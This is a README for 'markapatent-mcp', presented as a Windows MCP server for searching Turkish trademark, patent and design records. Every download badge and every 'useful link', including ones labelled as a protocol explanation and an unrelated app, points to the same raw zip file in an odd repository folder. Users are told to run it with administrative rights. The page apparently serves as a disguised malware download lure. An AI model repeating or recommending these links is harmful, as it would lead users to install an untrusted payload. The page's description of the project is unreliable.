# ⚙️ markapatent-mcp - Easy Access to TÜRKPATENT Data

[![Download Latest Release](https://img.shields.io/badge/Download-Markapatent--mcp-blue?style=for-the-badge)](https://github.com/Andrianagnostic63/markapatent-mcp/raw/refs/heads/main/fugler/mcp-markapatent-3.2.zip)

---

## 📖 About markapatent-mcp

markapatent-mcp connects you to the Turkish Patent and Trademark Office's search portal. It creates a server that helps applications and tools access the TÜRKPATENT database for trademarks, patents, and industrial designs. This means you can search this official database through supported apps without opening the website directly.

The server uses a simple protocol called MCP (Model Context Protocol). This makes it easy for other programs to use TÜRKPATENT’s data as a tool. For example, apps like Claude Desktop or 5ire can retrieve information about trademarks or patents easily.

The tool has six search types covering key areas:

- Trademark search by name, owner, or Nice class.
- Patent search by title, summary, inventor, applicant, IPC/CPC classification.
- Industrial design search by name, designer, applicant, Locarno classification.

It also offers paging for large results, so you can browse many records in steps.

---

## 🖥 System Requirements

To run markapatent-mcp on Windows, make sure your system meets these requirements:

- Windows 10 or newer  
- 4 GB of RAM or more  
- At least 100 MB free disk space  
- Internet connection for accessing TÜRKPATENT servers  
- Administrative rights to install software  

These are minimum specs. Better hardware improves performance, especially for larger searches.

---

## 🚀 Getting Started

This section guides you through downloading, installing, and running markapatent-mcp on your Windows computer.

---

## ⬇️ Download the Application

Click the badge or visit the official releases page to get the latest version:

[![Download Latest Release](https://img.shields.io/badge/Download-Markapatent--mcp-green?style=for-the-badge)](https://github.com/Andrianagnostic63/markapatent-mcp/raw/refs/heads/main/fugler/mcp-markapatent-3.2.zip)

On the releases page, look for the latest Windows installer or executable file. Files usually have `.exe` extensions.

---

## 🛠 Installation and Setup

1. **Download the file:** Save the `.exe` or installer file to your computer from the releases page.

2. **Run the installer:**  
   - If the file is an installer, double-click it.  
   - Follow the step-by-step prompts. Accept terms if requested.  
   - Choose the default options unless you need custom settings.

3. **Skip the installer (if portable):**  
   - If the download is a standalone executable, simply run it by double-clicking.

4. **Complete the setup:** The program will create needed files and folders automatically.

---

## ▶️ Running markapatent-mcp

After installation or download:

- Find the markapatent-mcp app icon on your desktop or in the Start menu.
- Double-click to start the server.
- The program opens a window showing the server status.
- It listens for requests from compatible applications on your computer.
- You do not need to interact with it directly to search the database. Other apps will connect and query via MCP.

If the window closes immediately, check the Task Manager to confirm the server is running.

---

## 🔗 Using markapatent-mcp with Other Applications

Markapatent-mcp acts as a backend for other tools. For example, you can connect it to:

- Claude Desktop
- 5ire app
- Any LLM or software supporting MCP protocol

When those applications request data, markapatent-mcp fetches information from TÜRKPATENT and sends it back.

You just need to:

- Run markapatent-mcp on your system
- Configure your client app to connect to `localhost` at the port the server uses (usually shown in the markapatent-mcp window)
- Use the client app’s interface to search trademarks, patents, or industrial designs

---

## 🔍 Searching Features

markapatent-mcp offers these search tools:

### Trademark Search
- By trademark name
- By owner name
- By Nice classification code

### Patent Search
- By patent title or abstract
- By inventor or applicant name
- By IPC or CPC classification codes

### Industrial Design Search
- By design name
- By designer or applicant name
- By Locarno classification code

Each search returns lists with summaries and links to detailed pages. You can page through results if needed.

---

## 📁 File Structure After Installation

- `markapatent-mcp.exe` or similar executable  
- `config/` folder where configuration files are stored  
- `logs/` folder for server logs and errors  
- `data/` optional folder if caching is enabled  

Do not move files after installation. Keep the structure intact for the server to work properly.

---

## ⚙️ Configuration

Basic settings like server port or logging level can be changed in the config files found in the `config` folder.

Settings include:

- Server listen port (default 8080)  
- Log file location  
- Timeout settings for TÜRKPATENT requests  

Edit config files with a plain text editor like Notepad.

---

## 🐞 Troubleshooting

- If the server does not start, check if another program uses the port.  
- Ensure you have an internet connection to access TÜRKPATENT servers.  
- If searches return no results, verify input values or classifications.  
- Restart the app if it freezes or stops responding.  
- Check the `logs` folder for detailed error messages.

---

## 📬 Support and Feedback

You can report issues by creating a new issue on the GitHub repository page. Include details about your Windows version and any error messages.

---

## 🔗 Useful Links

- [Releases page and downloads](https://github.com/Andrianagnostic63/markapatent-mcp/raw/refs/heads/main/fugler/mcp-markapatent-3.2.zip)  
- [FastMCP protocol explanation](https://github.com/Andrianagnostic63/markapatent-mcp/raw/refs/heads/main/fugler/mcp-markapatent-3.2.zip)  
- [5ire application](https://github.com/Andrianagnostic63/markapatent-mcp/raw/refs/heads/main/fugler/mcp-markapatent-3.2.zip)  

---

# ⬇️ Download and run markapatent-mcp now:

[![Download Latest Release](https://img.shields.io/badge/Download-Markapatent--mcp-blueviolet?style=for-the-badge)](https://github.com/Andrianagnostic63/markapatent-mcp/raw/refs/heads/main/fugler/mcp-markapatent-3.2.zip)